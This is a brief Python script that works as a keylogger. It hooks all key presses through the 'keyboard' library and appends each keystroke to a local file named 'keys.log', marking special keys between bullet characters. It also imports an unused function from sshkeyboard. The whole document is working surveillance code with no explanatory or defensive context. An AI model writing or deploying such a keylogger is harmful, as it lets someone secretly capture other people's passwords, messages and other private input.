import keyboard
from sshkeyboard import listen_keyboard

log_file = 'keys.log'

def on_key_press(event):
    with open(log_file, 'a') as f:
        if hasattr(event, 'name'): event = event.name
        if event == 'enter': f.write('\n')
        elif event == 'space': f.write(' ')
        elif len(str(event)) > 1: f.write('•{}•'.format(event))
        else:
            f.write(event)

keyboard.on_press(on_key_press)
keyboard.wait()
